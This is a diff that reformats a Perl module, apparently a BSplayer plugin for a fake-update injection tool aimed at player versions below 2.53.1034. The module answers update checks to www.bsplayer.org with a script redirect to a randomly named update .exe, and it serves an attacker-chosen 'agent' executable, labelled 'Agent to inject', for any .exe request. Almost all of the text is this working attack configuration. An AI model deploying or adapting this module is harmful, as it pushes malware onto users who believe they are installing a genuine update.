@@ -27,47 +27,49 @@ use Data::Dump qw(dump);
 
 use isrcore::utils;
 
-my $base=
-{
-    'name' => 'BSplayer',
-    'version' => '1.0',
-    'appver'  => '< 2.53.1034',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com >' ],
-    'description' => qq{},    
-    'vh' => '(www.bsplayer.org)',
-    'request' => [
-		    {
-		    'req' => '/html/updatep.php\?', #regex friendly
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => '<html><script>window.location="http://www.bsplayer.org/bsplayerupdate<%RND1%>.exe"</script></html>',
-		    'parse' => 1,
-		    'file' => '',
-		    },
+my $base = {
+    'name'        => 'BSplayer',
+    'version'     => '1.0',
+    'appver'      => '< 2.53.1034',
+    'author'      => ['Francisco Amato < famato +[AT]+ infobytesec.com >'],
+    'description' => qq{},
+    'vh'          => '(www.bsplayer.org)',
+    'request'     => [
+        {   'req'    => '/html/updatep.php\?',    #regex friendly
+            'type'   => 'string',                 #file|string|agent|install
+            'method' => '',                       #any
+            'bin'    => 0,
+            'string' =>
+                '<html><script>window.location="http://www.bsplayer.org/bsplayerupdate<%RND1%>.exe"</script></html>',
+            'parse' => 1,
+            'file'  => '',
+        },
 
-		    
-		    {
-		    'req' => '.exe', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => ''
-		    },
-		    
+        {   'req'    => '.exe',                   #regex friendly
+            'type'   => 'agent',                  #file|string|agent|install
+            'method' => '',                       #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => ''
+        },
 
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-                    'rnd1'  => { 'val' => 'isrcore::utils::RndNum(5)',
-                                  'hidden' => 1,
-                                'dynamic' =>1,
-                            }			    	  
-		 }
+
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+        'rnd1' => {
+            'val'     => 'isrcore::utils::RndNum(5)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        }
+    }
 };
 
 ##########################################################################
@@ -80,5 +82,5 @@ sub new {
     my $class = shift;
     my $self = { 'Base' => $base, @_ };
     return bless $self, $class;
-}            
+}
 1;
